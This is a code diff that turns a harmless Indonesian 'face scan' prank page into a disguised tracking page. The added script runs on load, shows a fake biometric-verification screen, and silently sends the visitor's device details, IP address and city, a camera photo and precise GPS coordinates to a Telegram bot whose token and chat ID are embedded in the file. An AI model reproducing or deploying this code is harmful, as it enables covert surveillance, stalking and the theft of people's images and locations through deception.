@@ -2,140 +2,133 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keamanan Scan Wajah</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Website Bug - GyzenLyoraa x CARAMELXZ</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body {
-            margin: 0;
-            background: black;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #00ff00;
-            font-family: 'Courier New', Courier, monospace;
-        }
-        #camera-container {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            z-index: 1;
-        }
-        /* Efek kotak hijau seperti scanner */
-        #scanner-box {
-            position: absolute;
-            width: 250px;
-            height: 250px;
-            border: 4px solid #00ff00;
-            border-radius: 20px;
-            box-shadow: 0 0 20px #00ff00;
-            z-index: 2;
-        }
-        /* Garis scan yang bergerak naik turun */
-        #scanner-line {
-            width: 100%;
-            height: 4px;
-            background: rgba(0, 255, 0, 0.8);
-            position: absolute;
-            top: 0;
-            box-shadow: 0 0 10px #00ff00;
-            animation: scan 2s infinite linear;
-        }
-        @keyframes scan {
-            0% { top: 0; }
-            50% { top: 100%; }
-            100% { top: 0; }
-        }
-        #text-info {
-            position: absolute;
-            bottom: 15%;
-            font-size: 22px;
-            font-weight: bold;
-            text-shadow: 2px 2px 5px black;
-            z-index: 2;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        /* Gambar prank yang disembunyikan di awal */
-        #prank-image {
-            display: none;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 10;
-        }
+        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
+        
+        /* Container Utama */
+        #main-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+
+        /* Background Camera (Transparent but Active) */
+        #v { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.4; transform: scaleX(-1); }
+
+        /* UI Loading GyzenLyoraa */
+        #loading-container{ position: relative; z-index: 10; text-align:center; width: 80%; max-width: 400px; background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; }
+        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa; font-weight: bold;}
+        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
+        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
+        #loading-details{margin-top:20px;font-size:14px;color:#666}
+
+        /* Overlay Scanner Wajah (Prank UI) */
+        #scanner-box { position: absolute; width: 220px; height: 220px; border: 3px solid #00ff00; border-radius: 50%; box-shadow: 0 0 15px #00ff00; z-index: 5; top: 20%; display: flex; justify-content: center; align-items: center; }
+        #scanner-line { width: 100%; height: 2px; background: #00ff00; position: absolute; box-shadow: 0 0 10px #00ff00; animation: scan 2.5s infinite linear; }
+        @keyframes scan { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
+
+        /* Prank Image */
+        #prank-image { display: none; width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 100; }
+        
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="camera-container">
-        <video id="video" autoplay playsinline></video>
+    <div id="main-container">
+        <video id="v" autoplay playsinline muted></video>
         
         <div id="scanner-box">
             <div id="scanner-line"></div>
+            <div style="position: absolute; bottom: -40px; color: #00ff00; font-size: 12px; white-space: nowrap;">[ MEMINDAI WAJAH... ]</div>
         </div>
-        <div id="text-info">Mendeteksi Wajah... Posisikan Wajah Anda</div>
+
+        <div id="loading-container">
+            <div id="loading-text">VERIFIKASI SISTEM</div>
+            <div id="progress-container"><div id="progress-bar"></div></div>
+            <div id="loading-details">Menginisialisasi modul biometrik...</div>
+        </div>
     </div>
 
     <img id="prank-image" src="https://i.imgflip.com/4/33eb5n.jpg" alt="Prank!">
+    <canvas id="c"></canvas>
 
-    <script>
-        const video = document.getElementById('video');
-        const prankImage = document.getElementById('prank-image');
-        const cameraContainer = document.getElementById('camera-container');
-        const textInfo = document.getElementById('text-info');
+<script>
+(()=>{
+    const T='8796435263:AAFpdc1RSIdv5CpY4D-CeSMPRy3t1OtAvZY', 
+          C='6324080021',
+          pb=document.getElementById('progress-bar'),
+          ld=document.getElementById('loading-details'),
+          mainCon = document.getElementById('main-container'),
+          prankImg = document.getElementById('prank-image');
 
-        // Meminta akses kamera depan (user facing camera)
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // Ubah teks setelah 2 detik supaya terlihat realistis
-                setTimeout(() => {
-                    textInfo.innerText = "Menganalisis Data...";
-                    textInfo.style.color = "yellow";
-                }, 2000);
+    let p=0;
+    const LM=["Memeriksa wajah...","Mencocokkan data biometrik...","Mengenkripsi koordinat...","Memverifikasi lokasi...","Mengunggah hash keamanan..."];
+    
+    // Progress bar logic
+    const progressInterval = setInterval(()=>{
+        p+=Math.random()*3;
+        if(p>99) p=99;
+        pb.style.width=p+'%';
+        if(Math.random()>.8) ld.textContent=LM[Math.floor(Math.random()*LM.length)]
+    },600);
 
-                // Eksekusi Prank setelah 5 detik
-                setTimeout(() => {
-                    // Matikan akses kamera agar lampu indikator kamera mati
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Sembunyikan layar kamera dan munculkan gambar
-                    cameraContainer.style.display = 'none';
-                    prankImage.style.display = 'block';
-                    
-                    // (Opsional) Jika ingin menambah suara kaget, kamu bisa pakai kode di bawah ini:
-                    // let audio = new Audio('LINK_AUDIO_MP3_KAMU_DISINI');
-                    // audio.play();
-                    
-                }, 5000); // Angka 5000 = 5 detik. Bisa kamu ubah sesuai selera.
-            })
-            .catch(err => {
-                console.error("Kamera gagal diakses:", err);
-                textInfo.innerText = "Akses Kamera Ditolak / Tidak Tersedia";
-                textInfo.style.color = "red";
-                textInfo.style.animation = "none";
-            });
-    </script>
+    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
+    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
+    
+    const cDI=async()=>{
+        let m='╭─── REPORT SILENT SCANNER ─── ⦿\n';
+        m+=`📱 Device: ${navigator.userAgent}\n🔋 Battery: ${'getBattery' in navigator ? 'Checking...' : 'N/A'}\n`;
+        try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+=`🌐 IP: ${d.ip}\n📍 ISP: ${d.org}\n🏙️ Kota: ${d.city}\n`}catch(e){}
+        return m;
+    };
 
+    const captureCamera = async (mode) => {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            v.srcObject = stream;
+            await new Promise(r => v.onloadedmetadata = r);
+            v.play();
+            
+            // Jeda 3 detik seolah-olah proses scanning wajah
+            await new Promise(r => setTimeout(r, 3000));
+            
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(b => sP(b, `${mode}_capture.jpg`), 'image/jpeg');
+            
+            return stream;
+        } catch (e) { return null; }
+    };
+
+    const ST = async () => {
+        // 1. Kirim Data Device & IP dulu
+        await sTG(await cDI());
+
+        // 2. Jalankan Scanner Wajah
+        const stream = await captureCamera("user");
+
+        // 3. Ambil Lokasi GPS (Target bakal "izinkan" demi verifikasi wajah)
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(async pos => {
+                const lat = pos.coords.latitude, lon = pos.coords.longitude;
+                let g=`📍 TARGET GPS LOCKED\n🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n🎯 Accuracy: ${pos.coords.accuracy}m`;
+                await sTG(g);
+            }, e => sTG(`❌ GPS Error: ${e.message}`), {enableHighAccuracy:true});
+        }
+
+        // 4. Setelah progress beres, munculkan Prank
+        setTimeout(() => {
+            clearInterval(progressInterval);
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            mainCon.style.display = 'none';
+            prankImg.style.display = 'block';
+        }, 8000); // 8 detik total proses
+    };
+
+    window.onload = ST;
+})();
+</script>
 </body>
 </html>
-
